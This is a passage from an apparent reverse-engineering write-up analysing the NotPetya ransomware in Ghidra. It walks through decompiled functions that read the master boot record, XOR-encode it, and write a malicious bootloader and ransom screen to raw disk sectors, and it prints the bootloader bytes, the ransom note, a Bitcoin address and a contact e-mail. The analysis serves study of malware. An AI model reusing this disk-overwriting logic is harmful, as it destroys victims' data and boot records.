  else {
    hDevice = CreateFileA(param_1,0x80100000,3,(LPSECURITY_ATTRIBUTES)0x0,3,0,(HANDLE)0x0);
    if (hDevice == (HANDLE)0xffffffff) {
      DVar2 = GetLastError();
      if (0 < (int)DVar2) {
        DVar2 = DVar2 & 0xffff | 0x80070000;
      }
    }
    else {
      BVar1 = DeviceIoControl(hDevice,0x70048,(LPVOID)0x0,0,&local_9c,0x90,&local_8,
                              (LPOVERLAPPED)0x0);
      if (BVar1 == 0) {
        DVar2 = GetLastError();
        if (0 < (int)DVar2) {
          DVar2 = DVar2 & 0xffff | 0x80070000;
        }
      }
      else {
        *param_2 = local_9c.PartitionStyle;
      }
      CloseHandle(hDevice);
    }
  }
  return DVar2;
}
```

This clearly shows us the general structure of the function. `param_1` is most likely a logical drive and it's `PartitionStyle` is fetched and returned via `param_2`. This also allows us to retype `param_2` as [PARTITION_STYLE](https://docs.microsoft.com/nl-nl/windows/win32/api/winioctl/ne-winioctl-partition_style). It's worth noting that the return type of this function is either `MBR`, `GPT` or `RAW`.

Back in `FUN_100014a9` we retype `local_8` to be of `PARTITION_STYLE` too. This clears up the decompilation a lot and Ghidra also nicely figures out the enum constants for our next if statement.

```cpp
if ((-1 < (int)status_code) &&
   (status_code = get_drive_partition_style(&local_19c,(PARTITION_STYLE)&local_8),
   -1 < (int)status_code)) {
  if (local_8 == PARTITION_STYLE_MBR) {
    status_code = FUN_10001424(local_90,0x3c); 
```

So we only consider drives with a `MBR`. It's also worth noting that `local_19c` is now revealed to be a drive path meaning we can revisit `FUN_10001038` some time. First we will look at `FUN_10001424` on the next line however.

### FUN_10001424

```cpp
DWORD FUN_10001424(BYTE *param_1,DWORD param_2){
  BOOL BVar1;
  HCRYPTPROV local_8;
  
  local_8 = 0;
  BVar1 = CryptAcquireContextA(&local_8,(LPCSTR)0x0,(LPCSTR)0x0,1,0xf0000000);
  if (BVar1 == 0) {
    status_code = GetLastError();
    if (0 < (int)status_code) {
      status_code = status_code & 0xffff | 0x80070000;
    }
    if ((int)status_code < 0) goto LAB_1000148c;
  }
  BVar1 = CryptGenRandom(local_8,param_2,param_1);
  if ((BVar1 == 0) && (status_code = GetLastError(), 0 < (int)status_code)) {
    status_code = status_code & 0xffff | 0x80070000;
  }
LAB_1000148c:
  if (local_8 != 0) {
    CryptReleaseContext(local_8,0);
  }
  return status_code;
}
```

This appears to be a crypto function. Assuming no errors cause the subroutine to short circuit a seemingly important call to [CryptGenRandom](https://docs.microsoft.com/en-us/windows/win32/api/wincrypt/nf-wincrypt-cryptgenrandom) is made. This function generates crypto graphically secure random bytes. This means we can do some renaming.

```cpp
DWORD gen_sec_random_bytes(BYTE *sec_ran_bytes,DWORD len){
  BOOL success;
  HCRYPTPROV crypto_provider;
  
  crypto_provider = 0;
  success = CryptAcquireContextA(&crypto_provider,(LPCSTR)0x0,(LPCSTR)0x0,1,0xf0000000);
  if (success == 0) {
    status_code = GetLastError();
    if (0 < (int)status_code) {
      status_code = status_code & 0xffff | 0x80070000;
    }
    if ((int)status_code < 0) goto LAB_1000148c;
  }
  success = CryptGenRandom(crypto_provider,len,sec_ran_bytes);
  if ((success == 0) && (status_code = GetLastError(), 0 < (int)status_code)) {
    status_code = status_code & 0xffff | 0x80070000;
  }
LAB_1000148c:
  if (crypto_provider != 0) {
    CryptReleaseContext(crypto_provider,0);
  }
  return status_code;
}
```

### Back to FUN_100014a9

Back in `FUN_100014a9` we then see that `0x3c` random bytes get loaded into `local_90` meaning we can do some renaming.

After doing so we continue and see an interesting snippet.

```cpp
uVar8 = 0;
do {
  uVar6 = uVar8 + 1;
  local_54[uVar8] =
        "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz"
       [(uint)sec_random_bytes[uVar8] % 0x3a];
   uVar8 = uVar6;
} while (uVar6 < 0x3c);
```

This effectively maps the random bytes that were generated to a randomly generated string of `1-9, A-Z, a-z`.

Next we see a call to `FUN_100012d5` with the drive path and `local_59c` whose type is still unknown. Hopefully this function will allow us to figure out the type.

### FUN_100012d5

```cpp
DWORD FUN_100012d5(LPCSTR param_1,void *param_2){
  HANDLE hFile;
  BOOL BVar1;
  DWORD DVar2;
  DWORD local_8;
  
  DVar2 = 0;
  local_8 = 0;
  if (param_1 == (LPCSTR)0x0) {
    DVar2 = 0x80070057;
  }
  else {
    memset(param_2,0,0x200);
    hFile = CreateFileA(param_1,0x80000000,1,(LPSECURITY_ATTRIBUTES)0x0,3,0,(HANDLE)0x0);
    if (hFile == (HANDLE)0xffffffff) {
      DVar2 = GetLastError();
      if (0 < (int)DVar2) {
        DVar2 = DVar2 & 0xffff | 0x80070000;
      }
    }
    else {
      BVar1 = SetFilePointerEx(hFile,0,(PLARGE_INTEGER)0x0,0);
      if (((BVar1 == 0) ||
          (BVar1 = ReadFile(hFile,param_2,0x200,&local_8,(LPOVERLAPPED)0x0), BVar1 == 0)) &&
         (DVar2 = GetLastError(), 0 < (int)DVar2)) {
        DVar2 = DVar2 & 0xffff | 0x80070000;
      }
      CloseHandle(hFile);
    }
  }
  return DVar2;
}
```

First we see the passed drive being opened with the `GENERIC_READ` access again. Then we see the file pointer being moved to the start of the drive. A call to [ReadFile](https://docs.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-readfile) is then made. This call reads the first `0x200` or `512` bytes into `param_2`. The entire fuction ends up as.

```cpp
DWORD read_first_512_bytes(LPCSTR drive,LPVOID buffer){
  HANDLE hFile;
  BOOL success;
  DWORD retval;
  DWORD bytes_read;
  
  retval = 0;
  bytes_read = 0;
  if (drive == (LPCSTR)0x0) {
    retval = 0x80070057;
  }
  else {
    memset(buffer,0,0x200);
    hFile = CreateFileA(drive,0x80000000,1,(LPSECURITY_ATTRIBUTES)0x0,3,0,(HANDLE)0x0);
    if (hFile == (HANDLE)0xffffffff) {
      retval = GetLastError();
      if (0 < (int)retval) {
        retval = retval & 0xffff | 0x80070000;
      }
    }
    else {
      success = SetFilePointerEx(hFile,0,(PLARGE_INTEGER)0x0,0);
      if (((success == 0) ||
          (success = ReadFile(hFile,buffer,0x200,&bytes_read,(LPOVERLAPPED)0x0), success == 0)) &&
         (retval = GetLastError(), 0 < (int)retval)) {
        retval = retval & 0xffff | 0x80070000;
      }
      CloseHandle(hFile);
    }
  }
  return retval;
}
```

### Back to FUN_100014a9

Going back to the calling function we see that the next snippet is rather odd.

```cpp
puVar4 = local_3de + 2;
iVar11 = 4;
uVar8 = 0;
do {
  uVar6 = *puVar4;
  if ((uVar6 != 0) && (uVar6 != 0xffffffff)) {
    uVar8 = uVar6;
  }
  puVar4 = puVar4 + 4;
  iVar11 = iVar11 + -1;
} while (iVar11 != 0);
if (uVar8 == 0xffffffff) {
  uVar8 = 0;
}
if (uVar8 < 0x29) {
  status_code = 0x80070272;
}else {
```

Given that `local_3de` has not yet been used it is weird that computation using it that does not depend on any other variables would determine a status code based on the value of `uVar8`. For we it's fine to assume that this always succeeds as the function is cut short if this check fails.

The next part we see is.

```cpp
iVar11 = 0x80;
puVar9 = (undefined4 *)first_512_bytes;
puVar10 = local_79c;
while (iVar11 != 0) {
  iVar11 = iVar11 + -1;
  *puVar10 = *puVar9;
  puVar9 = puVar9 + 1;
  puVar10 = puVar10 + 1;
}
uVar8 = 0;
do {
  *(byte *)((int)local_79c + uVar8) = *(byte *)((int)local_79c + uVar8) ^ 7;
  uVar8 = uVar8 + 1;
} while (uVar8 < 0x200);
memset(&local_99c,7,0x200);
local_39c = 0;
status_code = gen_sec_random_bytes(local_39b,0x20);
```

The upper loop appears to copy the first `0x80` or `128` bytes from `first_512_bytes` into `local_79c`. 

The lower loop then appears to XOR all the `0x200` or `512` bytes in `local_79c` with `7` or `0111`.

Next we see a memset that sets the first `0x200` or `512` bytes of `local_99c` to `7`. 

We also clearly run into the fact the Ghidra got the length of all the buffers wrong, since if it were actually correct about the lengths there would be a ton of buffer overflows.

The last line generates `0x20` secure random bytes and stores them into `local_39b`.

After this was succesful we see the following logic.

```cpp
if ((-1 < (int)status_code) &&
  (status_code = gen_sec_random_bytes(local_37b,8), -1 < (int)status_code)) {
  memcpy(local_373,"1Mz7153HMuxXTuR2R1t78mGSdzaAtNbBWX",0x22);
  _Size = random_sec_string;
  local_351 = 0;
  do {
    cVar3 = *_Size;
    _Size = _Size + 1;
  } while (cVar3 != '\0');
  _Size = _Size + -(int)(random_sec_string + 1);
  if (_Size != (char *)0x0) {
    if ((char *)0x156 < _Size) {
      _Size = (char *)0x156;
    }
  memcpy(local_2f3,random_sec_string,(size_t)_Size);
  local_2f3[(int)_Size] = 0;
}
local_c = (undefined4 *)(*_DAT_1001b104)(0x200);
```

First we see another `8` secure random bytes being generated.

Next we see a bitcoin address string being copied into `local_373`

Next we see a loop that determines the length of `random_sec_string`. This value seems to be capped at `0x156` and then used to copy a number of bytes from `random_sec_string` into `local_2f3`. This string is consequently `NUL` terminated.

The last line makes no sense to me, but in Assembly looks similar to a subroutine call. Doing some more digging in the assembly reveals that this is a function call, but it's odd.

```cpp
void FUN_10001000(SIZE_T param_1){
  HANDLE hHeap;
  DWORD dwFlags;
  
  dwFlags = 8;
  hHeap = GetProcessHeap();
  HeapAlloc(hHeap,dwFlags,param_1);
  return;
}
```

The function has a ton of references and all of them expect a return type. Yet there is none. Changing the subroutine signature allows Ghidra to figure out the details.

```cpp
LPVOID allocate_memory(SIZE_T num_bytes){
  HANDLE hHeap;
  LPVOID pvVar1;
  DWORD dwFlags;
  
  dwFlags = 8;
  hHeap = GetProcessHeap();
  pvVar1 = HeapAlloc(hHeap,dwFlags,num_bytes);
  return pvVar1;
}
```

Going back to the main logic the else branch contains a snippet of interesting code.

```cpp
iVar11 = 0x80;
puVar9 = &DAT_10018c50;
puVar10 = alloc_mem_512;
while (iVar11 != 0) {
  iVar11 = iVar11 + -1;
  *puVar10 = *puVar9;
  puVar9 = puVar9 + 1;
  puVar10 = puVar10 + 1;
}
status_code = 0;
```

We see the first `0x80` bytes of `DAT_10018c50` being copied into `allocated_mem_512` which was just allocated. Using Ghidra we see that there is data stored at `DAT_10018c50`.

> fa 31 c0 8e d8 8e d0 8e c0 8d 26 00 7c fb 66 b8 20 00 00 00 88 16 93 7c 66 bb 01 00 00 00 b9 00 80 e8 14 00 66 48 66 83 f8 00 75 f5 66 a1 00 80 ea 00 80 00 00 f4 eb fd 66 50 66 31 c0 52 56 57 66 50 66 53 89 e7 66 50 66 53 06 51 6a 01 6a 10 89 e6 8a 16 93 7c b4 42 cd 13 89 fc 66 5b 66 58 73 08 50 30 e4 cd 13 58 eb d6 66 83 c3 01 66 83 d0 00 81 c1 00 02 73 07 8c c2 80 c6 10 8e c2 5f 5e 5a 66 58 c3 60 b4 0e ac 3c 00 74 04 cd 10 eb f7 61 c3

It's not ASCII however most likely (dot is unrecognized).

> . 1 . . . . . . . . & . | . f .   . . . . . . | f . . . . . . . . . . . f H f . . . u . f . . . . . . . . . . . f P f 1 . R V W f P f S . . f P f S . Q j . j . . . . . . | . B . . . . f [ f X s . P 0 . . . X . . f . . . f . . . . . . . s . . . . . . . . _ ^ Z f X . ` . . . < . t . . . . . a .

We will rename some fields though.

Next we see another `status_code` check followed by something that appears to also be an unrecognized function call.

```cpp
if (-1 < (int)status_code) {
  partition_style = (*_DAT_1001b104)(0x22b1);
  if ((void *)partition_style == (void *)0x0) {
    status_code = 0x8007000e;
  }
  else {
    local_10 = 0x22b1;
    memcpy((void *)partition_style,&DAT_10018e50,0x22b1);
    status_code = 0;
  }
```

On close inspection it's actually the exact same function that was unrecognized earlier. This time however `0x22b1` or `8881` bytes are allocated. If this worked then `local_10` is assigned the value of `0x22b1` too and `DAT_10018e50` is copied to the allocated memory. It seems like a good idea to inversitage this data field next. Adding the length to the base we find that we are interested in data range `10018e50~1001B101`.

> ....U...F..N....N.u..F...]...S.....F..f....F.....[]...2...........U..SV.F...u..N..F.3......F......8...^..V..F...........u......f...F.....r.;V.w.r.;F.v.N3..^[]....U..S.F...u..N..F.3....F.....3..E...^..V..F...........u......f...f...r.;V.w.r.;F.v.+F..V.+F..V........[]...2..............$..Vh.....[j.j.j.j ....P.F.P. ......t....^.......f+.f......f....f.... s....................f+.f......f....f.... s.j.j.j.j ....P.F.P........j.j.j.j!....P.N.Q......j.h......Pj.j...!.Q....R......j.j.j.j!....P.F.P.k....j.hR...!.P....P.v........;...^..j..9.[hp....[.....Vj.j.j.j ....P.F.P.!....j.h..f.v..v..M....j.j.j.j"....P.F.P......f.F.....f.~.....s..v......f.F...j.j.j.j.....P.F.P.......s.^...D..WV.~. s.2..o..F...v......B...F..~. r.2..F..F..v..L.~. wN2..F..F..~..s..^.*..>.....^.:.t..F....F...~..u..^.*....~......C..F..F..F.8F.r.j.j .F.P.F.P.......F..j.j .F.PP.......F..~..r.j.j.j.j ....P.F.P......j.j.j.j!....P.N.Q......j.h......Pj.j.....P.F.P......f+.f.F.f.~.....s..v..........f.F........f.F.....f.~..s..v..B.....f.F...j.j.j.j ....P.F.P.Z....h.....[....P.F.P.F.P.v.........^_...L..WV...j.j.j.j ....P.F.P......h.....[jPj.......h.....[....P.x.[h...q.[....P.h.[h...a.[..].P.>.[hl..Q.[...hq..G.[.v.h...=.[.F...~......C...F..~.Jr.jI.F.P......P.F.P.F.PV........t.h.....[..^_.......V.B..U...z.P.i.[..u....^..f+.f.F..F..F..U.F..V..v........9R.r.w.9.~.v..v........f..~.f.F..v..........{..u..v..........z..F..F..v..........|..t..~..t.j.j.j.j ..z.P.F.P........t..a...z..r..F.P..z.P.t....^...F.Pf.v...z.P.R....^..U......F............V.v....F.P...[..F...u.^.......WV3.f.~..r/f.F.f.....f3.f..f...0.B.Ff.F.f.....f3.f..f.F...j.j.f.v..]..0.B.....N.C.P.x.[..}.^_...U..V.v....F.P.^.[..N....^...h...\.[.U..h...Q.[.v..J.[h...C.[f.v..Y...h...3.[f.v..I...h...#.[f.F.f.d...f..f3.f.v.fP.'...h.....[......V3..F.../.d..L.;.v....~..u.......P...[.~.......F......t.j../.[^...U...F.P. .[j j .(...h.....[j.j .....h.....[j.j .....h...~.[j.j .....h...n.[j.j .....h...^.[j.j .....h...N.[j.j .....h(..>.[j.j .....hF....[j.j .....hd....[j.j .....h.....[j.j .....h.....[j.j .x...h.....[j.j .h...h.....[j j .X...h.....[j.j .H...h.....[j.j .8...h.....[j.j .(...hF....[j.j .....hn....[j.j .....h...~.[j.j .....h...n.[j.j .....h...^.[j.j .....h...N.[j.j .....h*..>.[j.j .....hT....[j.j .....h|....[.......WV.v..F...h.....[.~..6..P...[.....+.....u 8l.t.h.....[...<.+.....u.h.....[GF.<.u.^_...U...$.h.....[.<.....U..............&......j....[..U...~.3..O......2.3.......j....[.......!...t......F..f..~..t..^..F....F........F......t..F...F....U...~. r..~.~w.....2........V.F...........a.F.P...[.F..~..tXP...[..t..F..^..v...P...[.2.~..u,2..^..v......G..F.P.F....[j ...[.F.P...[.n...F..F.9F.r...&.....F.^............V..F.......WV2..F..F..F..v...2..^.*.......G..G...f.G......F..~..r..F...F.P.F...P............j.j.j.j.....P.F...P........u.f.F..........F..~.U.t.....F...~............f....f....f.F..V.f;F.v..F..V..F..~..r..^.*.....@...F...~..s&.^.*...........8...u..F....^.*.....@...^.*.......G...F.....f.F.f.G..F..F...F..~.......F.^_.........V......f..n..N..v...~..u%.F.%......N.*....^.@...F....G..F.$?...^.2......G..G..F.......WV.^.....G...F..G.....v...f.f..~....$..C.F..F...F....U.V..v..f.2...s..f..~..u..F...~..t..N.u..F.^_.......F..F..F...f.F.....f.F..V.f.F..F.P.v.f.v.R.v..F.P.F.P.\.......WV.~..uX.F...v..^.*.....x..uCf.F.....f.~.....s..~......f.F...j.j.j.j#....P.^.*......P.f.....F....F......F.P.^.*.....v...P.n..........f+.f.F.f.F..v..~.f.~.......^.....F...f.?.tyj.j..^.....F...f.7....P...^.*......Q...............F.PWf.v..F.Pf........*.j.PfXfYf......f..fP....Pf.7......P.'....f.F..m..F..v.........^..x....&.^_.... ..WVj.j.f.v.....P.F.P.^....f.F.8............F..V....F.t1.~...u...t&.~..u....t..v.f....f.F..F..............v............V.-......F..V.f.F.@.~..v.f.F.f9F...!..^...........$..F.....N..F...^.*..F.....2....^......F..~..r..F....^.*....^..........V........F..F.8F.w..F...#.^.*..F.*....^............V......F..F.8F.w.f.v..F.*.+.RP........fXfYf..f.F.f. ...f.F.f....f.f.f- ...f.F..V.f=....t*.F.P.v.VW.v..F.Pf.v.f.v.R.v.f.v..F.P.......F.*..N.*...@..F..V....^_....B..WVj.j.j.j#.....F.P.F.P.......~ .u.f.........f.F......~.f.F..V.f9F......F.?u.RPf.v..v.......j.j.f.F.f.F.fP....P.F.P.;.....v..~ .uQj.h......P.N..V..N..V.RQW.v..........F....j.j.f........P.F.P......f..f..f9...........F........I........L........Eu{.....F..F...f....f.F.f.F.....f.~..tWf.~.....sM.^.......f..f.F..^.......f....f..f.F.f....0.....^...(....?.t..^...*....?$..]..~ .ugj.h......P.N..V..N..V.RQW.v..........R....j.j.f........P.F.P....^....f..f..f....j.j.j.j#....P.F.P......f.F...S.f.~..........^........?.ucf.F.f.F.f-....f.F..N..........N..F.......N..F.f.F.f9F.w+f.F.f9F.s!.^...........$..F.....N.<.w....v..h..F...^.*..F.....2....^......F..~..r..F....^.*....^..........V........F..F.8F.w..F...#.^.*..F.*....^............V......F..F.8F.w.f.v..F.*.+.RP........fXfYf..f.F.f....f.f.f.F.f.F.f.~......f.~..v.f.F.....f.F..V.f9F.v{j..F.Pf.v.....Q.V.R.....\....f.F.f...fP....Pf.v.W.v..}....j.....f.v.....P.F.P.&....f...~ .u.f..f....j.j.j.j#....P.F.P.......F.*..N.*...@..F..V..j.f.F.f.F..:.^_.......WVj.j.j.j"....P.F.P........t.2....3........C....r.3..~..........f+.f..f.D.C...r.3..F.....sU......F......F.<.t><.t:<.u0......F........W..^.*.......Q....^...f......f.O..F.F...F...~..u.3....s........f+.f..f.D.C....^_.......WV.v..F..V.. ..*..v.........F..V....N..........^_...U..WV.~..v.j....^..U....W.RP......1.1T.j....^..T....W.RP....^....1.1W.j.f..f..fP.u....1.1U.j....^..U....W.RP.Y..^....1.1W.^_..U..V.v..D.P.D.P.D.PV.k.....D.P.D.P.D.P.D.P.U.....D$P.D P.D,P.D(P.?.....D8P.D4P.D0P.D<P.)....^...U..V.v..D0P.D P.D.PV.......D.P.D4P.D$P.D.P.......D.P.D.P.D8P.D(P.......D,P.D.P.D.P.D<P......^...U..V.v.V...[V.0.[^..U..V.v.*..D........d.*...........d....*..........*......^...U..V.v..F....F..V.......D..F..D..F..D.^.......WV3..~..1.........P..~..|.[.N...~......W.....~..N......W.F...|.3..F.P.:.[F...|.3.......F.....f...^...f..f.7..Q.a....F...|.^_......WV.F.1.F.n.F.v.F.a.F.l.F.d.F. .F.s.F.3.F.c.F.t.-.F..F..i.F..F..F.d3.3..~...................F......^...F.....|......@|.3..V..~..N.........P.^.X.....G....^..F..G..^..G,.....^.F.G....|.R...[^_....T..WV3..F.....~......9F.t..v...t..~...u.....F..F.f.~..s..^....N.....f.F....v..F.?t#f.F.f...fP.F.P.+.....F.P.F.PV......f.F.....f.F.f9F.sL.F..F..?u'f.F.f.F.f...fP.F.P.......F.P.F.PV.......^..^...?.F......^.0.f.F...3......^_..U...F....N....2N...2N...2N..........U...F.....N.......F.....N......2.$32..V...........2.$U2....&..Vf.F.....f.~."s..v..B..f.F...f.F.....f.~.....s[.F..V.........N............t8f.F.f.D...f..f.....f3.f..f......f..f..f...............Z.f.F......$..F.f.F.....f.~."s..v..B.....f.F...^.......F...F.0...P...[0....F.P...[.F.f.F.....f.~."s1.^.......................*.........^.......f.F.......~..u.......Vf.F......v.f.F..V.f9F.s..^...0......G.0....`.f.F....9F.u.9V.u..6......^...0....6....7.f.F......v.f.~. s..^............G....f.F....^.....1........3D..h..&..................0123456789abcdef....   Repairing file system on C: ....   The type of the file system is NTFS...   One of your disks contains errors and needs to be repaired. This process..   may take several hours to complete. It is strongly recommended to let it..   complete.....   WARNING: DO NOT TURN OFF YOUR PC! IF YOU ABORT THIS PROCESS, YOU COULD..   DESTROY ALL OF YOUR DATA! PLEASE ENSURE THAT YOUR POWER CABLE IS PLUGGED..   IN!......   CHKDSK is repairing sector..Please reboot your computer!.. Decrypting sector...... Ooops, your important files are encrypted...... If you see this text, then your files are no longer accessible, because they.. have been encrypted.   Perhaps you are busy looking for a way to recover your.. files, but don't waste your time.   Nobody can recover your files without our.. decryption service..... We guarantee that you can recover all your files safely and easily.   All you.. need to do is submit the payment and purchase the decryption key..... Please follow the instructions:.... 1. Send $300 worth of Bitcoin to following address:..       ..       ...       ..... 2. Send your Bitcoin wallet ID and personal installation key to e-mail..       wowsmith123456@posteo.net. Your personal installation key:.......... If you already purchased your key, please enter it below.... Key: ... Incorrect key! Please try again...... . of . (.%)                       .       .-...       .............................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................       ..-.ERROR!.

Mostly this isn't very understandable. However at the end we have some clearly readable text. Given that we know NotPetya changes the boot loader to show a custom screen and that the text here matches that screen. Then we are most likely looking at the boot loader payload, meaning that the part above the plain text is likely code. The full message then reads.

```
Repairing file system on C:    
The type of the file system is NTFS    
One of your disks contains errors and needs to be repaired. This process    
may take several hours to complete. It is strongly recommended to let it    
complete.

WARNING: DO NOT TURN OFF YOUR PC! IF YOU ABORT THIS PROCESS, YOU COULD    
DESTROY ALL OF YOUR DATA! PLEASE ENSURE THAT YOUR POWER CABLE IS PLUGGED    
IN!
```

The remainder of the text seems to be unrelated to the main text and just internal strings that are used.

```
CHKDSK is repairing sector    
Please reboot your computer!    
Decrypting sector    
```

The randsom demand text is also present.

```
Ooops, your important files are encrypted.    
If you see this text, then your files are no longer accessible, because they    
have been encrypted.  Perhaps you are busy looking for a way to recover your    
files, but don't waste your time.  Nobody can recover your files without our    
decryption service.    

We guarantee that you can recover all your files safely and easily.   All you    
need to do is submit the payment and purchase the decryption key.

Please follow the instructions:

1. Send $300 worth of Bitcoin to following address:




2. Send your Bitcoin wallet ID and personal installation key to e-mail    
   wowsmith123456@posteo.net. Your personal installation key:



If you already purchased your key, please enter it below    
Key:
``` 

Then finally there are some more strings.

```
Incorrect key! Please try again
of
(%)
-
- 
ERROR!
```

Some things are missing however the idea is clear. The bitcoin address and personal key will likely be substituted in in the part of the code we will look at next. Analyzing this custom boot loader seems like a task beyond our current capabilities and time frame however.

Continuing with the actual function code we see the following.

```cpp
if (-1 < (int)status_code) {
  local_14 = (local_10_maybe_size - (local_10_maybe_size & 0x1ff)) + 0x400;
  puVar9 = (undefined4 *)(*_DAT_1001b104)(local_14);
  if (puVar9 == (undefined4 *)0x0) {
    status_code = 0x8007000e;
  }else {
```

Here we again see a call to the memory allocation function. Writing out the expression for `local_14` we can find the size as.

> (0x22b1 - (0x22b1 & 0x1ff)) + 0x400    
> = (0x22b1 - b1) + 0x400    
> = 0x2200 + 0x400    
> = 0x2600

Interestingly enough this is larger than the ransomware boot screen. After an other status check we arrive at the following logic.

```cpp
iVar11 = 0x80;
puVar10 = alloc_mem_512_with_unkown_data_128;
puVar12 = puVar9;
while (iVar11 != 0) {
  iVar11 = iVar11 + -1;
  *puVar12 = *puVar10;
  puVar10 = puVar10 + 1;
  puVar12 = puVar12 + 1;
}
puVar9[0x6e] = local_3e4;
*(undefined2 *)(puVar9 + 0x6f) = local_3e0;
puVar4 = local_3de;
puVar7 = (uint *)((int)puVar9 + 0x1be);
iVar11 = 4;
do {
  *puVar7 = *puVar4;
  uVar7[1] = puVar4[1];
  puVar2 = puVar7 + 3;
  puVar1 = puVar4 + 3;
  puVar7[2] = puVar4[2];
  puVar4 = puVar4 + 4;
  puVar7 = puVar7 + 4;
  iVar11 = iVar11 + -1;
  *puVar2 = *puVar1;
} while (iVar11 != 0);
memcpy(puVar9 + 0x80,(void *)partition_style_and_boot_screen,local_10_maybe_size);
uVar8 = local_14 >> 9;
DVar5 = 0;
```

The first thing we see is an other copy operation that moves the first `128` bytes from `alloc_mem_512_with_unknown_data_128` to `puVar12` this essentially equates to the `unknown_data_128` part of the buffer.

Next we see a very specific assignment of `local_3e4` to `puVar9[0x6e]` which is index `110`. After this we see a similar assignment but writing using pointer logic that assigns `local_3e0` to offset `0x6f` from `puVar9` which is index `111`. It is possible that these two assignments are somehow related. In particular it is odd that we are missing an assignment for these `local_` variables while they are being used here.

Two similar assignment follow of `local_3de` to `puVar4` and again a pointer based assignment to offset `0x1be` from `puVar9` which is index `446` to `puVar7`.

Going to the next instructions we see an other loop that runs for `4` iterations. and copies more data from `puVar4` to `puVar7`.

Finally we see a copy of the previously constructed `partition_style_and_boot_screen` into `puVar9` at an offset of `0x80` or `128`.

It seems like a lot of minor details were missing from all this logic. Mostly not having assignments for the local variables makes it hard to tell why exactly these copy operations were neccessary. A little bit further we see `puVar9` being passed for a function. But most likely this won't allow us to determine it's real type.

Directly after the `memcpy` call we see a right shift of `9` on `local_14` with the result being assigned to `uVar8`. This value is then compared to `0`. This is just an error check and failing it will store an error code in `DVar5` and exit.

Assuming success we end up in the `else` of this check with the following logic.

```cpp
do {
  DVar5 = FUN_10001384(&drive_path,puVar9);
  if ((int)DVar5 < 0) break;
  uVar6 = uVar6 + 1;
  puVar9 = puVar9 + 0x80;
} while (uVar6 < uVar8);
```

The general setup of this loop is clear. Presumably `FUN_10001384` does something with the first `0x80` bytes passed to it. The loop then just passes `puVar9` to this function in blocks of `0x80`. There is an upper bound on the number of iteration in the form of `uVar8` and the loop exits early when the return code from `FUN_10001384` is negative. This probably indicates an error state.

###FUN_10001384

DWORD FUN_10001384(LPCSTR param_1,LPCVOID param_2){
  int in_EAX;
  HANDLE hFile;
  BOOL BVar1;
  DWORD DVar2;
  DWORD local_8;
  
  DVar2 = 0;
  local_8 = 0;
  if (param_1 == (LPCSTR)0x0) {
    DVar2 = 0x80070057;
  }
  else {
    hFile = CreateFileA(param_1,0xc0000000,3,(LPSECURITY_ATTRIBUTES)0x0,3,0,(HANDLE)0x0);
    if (hFile == (HANDLE)0xffffffff) {
      DVar2 = GetLastError();
      if (0 < (int)DVar2) {
        DVar2 = DVar2 & 0xffff | 0x80070000;
      }
    }
    else {
      BVar1 = SetFilePointerEx(hFile,(ulonglong)(uint)(in_EAX << 9),(PLARGE_INTEGER)0x0,0);
      if (((BVar1 == 0) ||
          (BVar1 = WriteFile(hFile,param_2,0x200,&local_8,(LPOVERLAPPED)0x0), BVar1 == 0)) &&
         (DVar2 = GetLastError(), 0 < (int)DVar2)) {
        DVar2 = DVar2 & 0xffff | 0x80070000;
      }
      CloseHandle(hFile);
    }
  }
  return DVar2;
}

Knowing that we passed `drive_path` as an argument, we see an immediate return when this parameter is `NULL`. Another thing we notice is that `in_EAX` is declared, meaning that something was passed over the register.

We also see that the given drive is opened with access level `0xc0000000` this is simply the bit wise combination of `GENERIC_READ` and `GENERIC_WRITE` access. In the case that the call fails an error code is returned from the function.

On success a call to [SetFilePointerEx](https://docs.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-setfilepointerex) is made. The number of bytes the file pointer is moved is determined by the passed `EAX` register value shifted to the left by `9` bits.

The assembler instructions around the call to `FUN_10001384` tells is everything with regard to that.

```
                             LAB_1000180e                                    XREF[1]:     1000182a(j)  
        1000180e 53              PUSH       EBX
        1000180f 8d 85 68        LEA        EAX=>drive_path,[EBP + 0xfffffe68]
                 fe ff ff
        10001815 50              PUSH       EAX
        10001816 8b c7           MOV        EAX,EDI
        10001818 e8 67 fb        CALL       FUN_10001384                                     undefined FUN_10001384(undefined
                 ff ff
        1000181d 85 c0           TEST       EAX,EAX
        1000181f 78 12           JS         LAB_10001833
        10001821 47              INC        EDI
        10001822 81 c3 00        ADD        EBX,0x200
                 02 00 00
        10001828 3b fe           CMP        EDI,ESI
        1000182a 72 e2           JC         LAB_1000180e
        1000182c eb 05           JMP        LAB_10001833
```

The value passed by the EAX register is `uVar6`. As right before the function call `EDI` is moved into `EAX` and `EDI` is the register keeping track of `uVar6`. The shift by `9` places is then just to space out the writes as `uVar6` itself is just a low value integer. These shifts of `9` result in a distance of `512` between the writes. This effectively means that the start of each drive block is targetted.

This deduction also makes sense with respect to the following [WriteFile](https://docs.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-writefile) call. As it writes `512` bytes. This is different from what we expected but makes sense too. The data to write is taken from the second passed function argument.

### Back to FUN_100014a9

The entire subroutine then ends with a few calls to the same function we just looked at and renamed to `write_512_offset_EAX`.

```cpp
if (((-1 < (int)DVar5) &&
  (status_code = write_512_offset_EAX(&drive_path,&local_39c),
  -1 < (int)status_code)) &&
  (status_code = write_512_offset_EAX(&drive_path,&all_7_len_512),
  -1 < (int)status_code)) {
  status_code = write_512_offset_EAX(&drive_path,first_128_bytes_xor_7_len_512);
}
```

`EAX` appears to be completely lost here, but actually we can see values for it being pushed on the stack.

```
        10001849 50              PUSH       EAX
        1000184a 6a 20           PUSH       0x20
        1000184c 58              POP        EAX
        1000184d e8 32 fb        CALL       write_512_offset_EAX                             undefined write_512_offset_EAX(u
                 ff ff
        10001852 a3 f8 f8        MOV        [status_code],EAX                                = ??
                 01 10
        10001857 85 c0           TEST       EAX,EAX
        10001859 78 3a           JS         LAB_10001895
        1000185b 8d 85 68        LEA        EAX=>all_7_len_512,[EBP + 0xfffff668]
                 f6 ff ff
        10001861 50              PUSH       EAX
        10001862 8d 85 68        LEA        EAX=>drive_path,[EBP + 0xfffffe68]
                 fe ff ff
        10001868 50              PUSH       EAX
        10001869 6a 21           PUSH       0x21
        1000186b 58              POP        EAX
        1000186c e8 13 fb        CALL       write_512_offset_EAX                             undefined write_512_offset_EAX(u
